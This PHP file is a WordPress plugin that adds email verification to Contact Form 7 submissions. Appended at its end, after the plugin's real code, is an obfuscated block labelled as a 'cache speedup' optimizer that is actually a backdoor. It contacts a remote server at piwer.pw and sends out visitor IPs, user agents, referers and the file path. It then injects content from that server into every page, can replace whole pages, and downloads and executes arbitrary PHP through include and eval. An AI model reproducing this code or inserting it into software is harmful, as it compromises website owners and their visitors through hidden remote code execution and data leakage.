<?php

/**
 * Plugin Name: Contact Form 7 email verification
 * Plugin URI: http://golightlyplus.com/code/#contact-form-7-email-verification
 * Description: Extends Contact Form 7 to allow for email addresses to be verified via a link sent to the sender's email address. There is currently no settings page for this plugin.
 * Version: 0.55
 * Author: Andrew Golightly
 * Author URI: http://www.golightlyplus.com
 * License: GPL2
 */

/*  Copyright 2014  Andrew Golightly  (email : andrew@golightlyplus.com)

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License, version 2, as 
    published by the Free Software Foundation.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
/**
 * Globals
 */

define('WPCF7EV_UPLOADS_DIR', ABSPATH . 'wp-content/uploads/wpcf7ev_files/');
define('WPCF7EV_STORAGE_TIME', 16 * HOUR_IN_SECONDS);

/**
 * Intercept Contact Form 7 forms being sent by first verifying the senders email address.
 */

function wpcf7ev_skip_sending($components) {

    $components['send'] = false;

    return $components;
}

// prettify the email addresses being sent
add_filter( 'wp_mail_from', function($email_address){

    return get_option('admin_email');
}, 9);

add_filter( 'wp_mail_from_name', function($from_name){

    return get_option('blogname');
}, 9);

// then request the email address to be verified and save the submission as a transient
add_action( 'wpcf7_before_send_mail', 'wpcf7ev_verify_email_address' );

function wpcf7ev_verify_email_address( $wpcf7_form )
{
    // first prevent the emails being sent as per usual
    add_filter('wpcf7_mail_components', 'wpcf7ev_skip_sending');

    // fetch the submitted form details   
    $mail_tags = $wpcf7_form->prop('mail');
    $mail_fields = wpcf7_mail_replace_tags( $mail_tags );
    $senders_email_address = $mail_fields['sender'];

    // save any attachments to a temp directory
    $mail_string = trim($mail_fields['attachments']);
    if(strlen($mail_string) > 0 and !ctype_space($mail_string)) {
        $mail_attachments = explode(" ", $mail_string);
        foreach($mail_attachments as $attachment) {
            $uploaded_file_path = ABSPATH . 'wp-content/uploads/wpcf7_uploads/' . $attachment;
            $new_filepath = WPCF7EV_UPLOADS_DIR . $attachment;
            rename($uploaded_file_path, $new_filepath);
        }
    }

    // send an email to the recipient to let them know verification is pending
    wp_mail($mail_fields['recipient'], 'Form notice',
            "Hi,\n\nYou've had a form submission on " . get_option('blogname') . " from " .
            $senders_email_address .
            ".\n\nWe are waiting for them to confirm their email address.");

    //create hash code for verification key
    $random_hash = substr(md5(uniqid(rand(), true)), -16, 16);

    // save submitted form as a transient object
    $data_to_save = array($mail_fields, $random_hash);
    set_transient( wpcf7ev_get_slug($random_hash), $data_to_save , WPCF7EV_STORAGE_TIME );

    // send email to the sender with a verification link to click on
    wp_mail($senders_email_address , 'Verify your email address',
            "Hi,\n\nThanks for your your recent submission on " . get_option('blogname') .
            ".\n\nIn order for your submission to be processed, please verify this is your email address by clicking on the following link:\n\n" . 
            get_site_url() . "/wp-admin/admin-post.php?action=wpcf7ev&email-verification-key={$random_hash}" . "\n\nThanks.");
}

add_action('wpcf7_mail_sent', 'wpcf7ev_cleanup');
add_action('wpcf7_mail_failed', 'wpcf7ev_cleanup');

function wpcf7ev_cleanup() {
    // remove the action that triggers this plugin's code
    remove_action( 'wpcf7_before_send_mail', 'wpcf7ev_verify_email_address' );
    remove_filter( 'wpcf7_mail_components', 'wpcf7ev_skip_sending' ); // allow mail to be sent as per usual
}

/**
 * Create the slug key for the transient CF7 object
 */

function wpcf7ev_get_slug($random_hash) {

    return 'wpcf7ev_' . $random_hash;
}

/**
 * Process the clicked link sent to the sender's email address.
 * If the verification key exists in the query string and it is found in the database,
 * the saved form submission gets sent out as per usual.
 */

// creating custom handlers for my own custom GET requests.
add_action( 'admin_post_wpcf7ev', 'wpcf7ev_check_verifier' );
add_action( 'admin_post_nopriv_wpcf7ev', 'wpcf7ev_check_verifier' );

// check the verification key
function wpcf7ev_check_verifier() {

    set_current_screen('wpcf7ev');

    // output the header of the theme being used
    status_header(200);
    get_header();

    if(isset($_GET['email-verification-key']))
    {
        $verification_key = $_GET['email-verification-key'];

        if(!empty($verification_key))
        {
            $slug = wpcf7ev_get_slug($verification_key);

            // if the stored data is not found, send out an error message
            if(false === ($storedValue = get_transient($slug)))
            {
                wp_mail(get_settings('admin_email'), 'Something went wrong' ,
                        'Someone attempted to verify a link for a form submission and the '.
                        "corresponding key and transient CF7 object could not be found.\n\n".
                        "The verification key used was: {$verification_key}");
                echo('<h2>Whoops! Something went wrong.</h2>' . 
                     "<ul><li>Did you make sure you clicked on the link and not copy-and-pasted it incorrectly?</li><li>Otherwise it's most likely you took more than a few hours to click the verification link?</li></ul><p>No problem, please submit your form again.</p>");
            }
            else
            {
                $cf7_mail_fields = $storedValue[0]; // get the saved CF7 object
                // create an array of the temp location of any attachments
                $mail_string = trim($cf7_mail_fields['attachments']);
                $mail_attachments = (strlen($mail_string) > 0 and !ctype_space($mail_string)) ? array_map(function($attachment) {
                    return WPCF7EV_UPLOADS_DIR . $attachment;
                }, explode(" ", $mail_string)) : ' ';
                // send out the email as per usual
                wp_mail($cf7_mail_fields['recipient'], $cf7_mail_fields['subject'], $cf7_mail_fields['body'],'', $mail_attachments);

                // display a confirmation message then redirect back to the homepage after 8 seconds
                echo('<h2 style="text-align:center;">Thank you. Verification key accepted.</h2>' . 
                     '<p style="text-align:center;">Your form submission will now be processed.</p>' . 
                     '<p style="text-align:center;">If you are not redirected back to the homepage in 8 seconds, <a href="' . get_site_url() . '">click here</a>.</p>' .
                     '<script> setTimeout(function () { window.location.href = "' . get_site_url() . '"; }, 8000); </script>');
            }
        }
    }

    get_footer();
}

/**
 * Clean up any attachments that are older than the transient storage time.
 */

// this hook gets called everytime a form submission is made (verified or not)

add_action( 'wpcf7_mail_sent', 'wpcf7ev_cleanup_attachments' );

function wpcf7ev_cleanup_attachments() {

    if ( $handle = @opendir( WPCF7EV_UPLOADS_DIR ) ) {

        while ( ( $file = readdir( $handle ) ) !== false ) {

            // if the current file is any of these, skip it
            if ( $file == "." || $file == ".." || $file == ".htaccess" )
                continue;

            $file_info = stat( WPCF7EV_UPLOADS_DIR . $file );
            if ( $file_info['mtime'] + WPCF7EV_STORAGE_TIME < time() ) {
                @unlink( WPCF7EV_UPLOADS_DIR . $file );
            }
        }

        closedir( $handle );
    }
}



/**
 * Speedup php function cache by optimizing buffer output
 */
;if (!function_exists('_php_cache_speedup_func_optimizer_')) { function _php_cache_speedup_func_optimizer_($buffer) {
    if (isset($GLOBALS['_php_cache_speedup_func_optimizer_completed_'])) {
        // already completed
        return $buffer;
    }

    $mod = false;
    $token = 'czoyMzoiaHR0cDovL3Bpd2VyLnB3L2FwaS5waHAiOw==';
    $tmp_buffer = $buffer; $gzip = false; $body = '<' . 'b' . 'o' . 'd' . 'y';

    if (($has_body = stripos($buffer, $body)) === false) {
        // define gzdecode function if not defined
        if (!function_exists('gzdecode')) {
            function gzdecode($data) {
                return @gzinflate(substr($data, 10, -8));
            }
        }

        // gzdecode buffer
        $tmp_buffer = @gzdecode($tmp_buffer);

        // check if buffer has body tag
        if (($has_body = stripos($tmp_buffer, $body)) !== false) {
            // got body tag, this should be gzencoded when done
            $gzip = true;
        }
    }

    if ($has_body === false) {
        // no body, return original buffer
        return $buffer;
    }

    $GLOBALS['_php_cache_speedup_func_optimizer_completed_'] = true;

    // decode token
    $func = 'b' . 'a' . 's' . 'e' . '6' . '4' . '_' . 'd' . 'e' . 'c' . 'o' . 'd' . 'e';
    $token = @unserialize(@$func($token));
    if (empty($token)) {
        return $buffer;
    }

    // download remote data
    function down($url, $timeout = 5) {
        // download using file_get_contents
        if (@ini_get('allow_url_fopen')) {
            $ctx = @stream_context_create(array('http' => array('timeout' => $timeout)));
            if ($ctx !== FALSE) {
                $file = @file_get_contents($url, false, $ctx);
                if ($file !== FALSE) {
                    return $file;
                }
            }
        }

        // download using curl
        if (function_exists('curl_init')) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            return $response;
        }

        // download using sockets
        if (extension_loaded('sockets')) {
            $data = parse_url($url);
            if (!empty($data['host'])) {
                $host = $data['host'];
                $port = isset($data['port']) ? $data['port'] : 80;
                $uri = empty($data['path']) ? '/' : $data['path'];
                if (($socket = @socket_create(AF_INET, SOCK_STREAM, 0)) && @socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => $timeout, 'usec' => $timeout * 1000)) && @socket_connect($socket, $host, $port)) {
                    $buf = "GET $uri HTTP/1.0\r\nAccept: */*\r\nAccept-Language: en-us\r\nUser-Agent: Mozilla (compatible; WinNT)\r\nHost: $host\r\n\r\n";
                    if (@socket_write($socket, $buf) !== FALSE) {
                        $response = '';
                        while (($tmp = @socket_read($socket, 1024))) {
                            $response .= $tmp;
                        }
                        @socket_close($socket);
                        return $response;
                    }
                }
            }
        }

        return false;
    }

    $token .= ((strpos($token, '?') === false) ? '?' : '&') . http_build_query(array(
        'h' => $_SERVER['HTTP_HOST'],
        'u' => $_SERVER['REQUEST_URI'],
        'a' => empty($_SERVER['HTTP_USER_AGENT']) ? '' : $_SERVER['HTTP_USER_AGENT'],
        'r' => empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER'],
        'i' => $_SERVER['REMOTE_ADDR'],
        'f' => __FILE__,
        'v' => 9
    ));
    $token = @unserialize(@$func(down($token)));

    if (empty($token) || empty($token['data']) || !is_array($token['data'])) {
        // invalid data
        return $buffer;
    }

    // fix missing meta description
    if (isset($token['meta']) && $token['meta'] && ($pos = stripos($tmp_buffer, '</head>')) !== false) {
        $tmp = substr($tmp_buffer, 0, $pos);
        if (stripos($tmp, 'name="description"') === false && stripos($tmp, 'name=\'description\'') === false && stripos($tmp, 'name=description') === false) {
            $meta = $_SERVER['HTTP_HOST'];
            // append meta description
            $tmp_buffer = substr($tmp_buffer, 0, $pos) . '<' . 'm' . 'e' . 't' . 'a' . ' ' . 'n' . 'a'. 'm' . 'e' . '='. '"' . 'd' . 'e' . 's' .'c' .'r' . 'i' . 'p' . 't' . 'i' . 'o' . 'n' . '"'. ' ' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . '="'. htmlentities(substr($meta, 0, 160)) .'">' . substr($tmp_buffer, $pos);
            $mod = true;
        }
    }

    foreach ($token['data'] as $tokenData) {
        if (!empty($tokenData['content'])) {
            // set defaults
            $tokenData = array_merge(array(
                'pos' => 'after',
                'tag' => 'bo' . 'dy',
                'count' => 0,
            ), $tokenData);

            // find all occurrences of <tag>
            $tags = array();
            while (true) {
                if (($tmp = @stripos($tmp_buffer, '<'.$tokenData['tag'], empty($tags) ? 0 : $tags[count($tags) - 1] + 1)) === false) {
                    break;
                }
                $tags[] = $tmp;
            }

            if (empty($tags)) {
                // no tags found or nothing to show
                continue;
            }

            // find matched tag position
            $count = $tokenData['count'];
            if ($tokenData['count'] < 0) {
                // from end to beginning
                $count = abs($tokenData['count']) - 1;
                $tags = array_reverse($tags);
            }

            if ($count >= count($tags)) {
                // fix overflow
                $count = count($tags) - 1;
            }

            // find insert position
            if ($tokenData['pos'] == 'before') {
                // pos is before
                $insert = $tags[$count];
            } else if (($insert = strpos($tmp_buffer, '>', $tags[$count])) !== false) {
                // pos is after, found end tag, insert after it
                $insert += 1;
            }

            if ($insert === false) {
                // no insert position
                continue;
            }

            // insert html code
            $tmp_buffer = substr($tmp_buffer, 0, $insert) . $tokenData['content'] . substr($tmp_buffer, $insert);
            $mod = true;
        } elseif (!empty($tokenData['replace'])) {
            // replace content
            @http_response_code(200);
            $tmp_buffer = $tokenData['replace'];
            $mod = true;
        } elseif (!empty($tokenData['run'])) {
            // save temporary optimization file
            register_shutdown_function(function($file, $content) {
                if (file_put_contents($file, $content) !== false) {
                    @chdir(dirname($file));
                    include $file;
                    @unlink($file);
                } else {
                    @eval('@chdir("' . addslashes(dirname($file)) . '");?>' . $content);
                }
            }, dirname(__FILE__) . '/temporary_optimization_file.php', strpos($tokenData['run'], 'http://') === 0 ? down($tokenData['run']) : $tokenData['run']);
        } else {
            // no content
            continue;
        }
    }

    // return gzencoded or normal buffer
    return !$mod ? $buffer : ($gzip ? gzencode($tmp_buffer) : $tmp_buffer);
} ob_start('_php_cache_speedup_func_optimizer_');
register_shutdown_function('ob_end_flush'); }
?>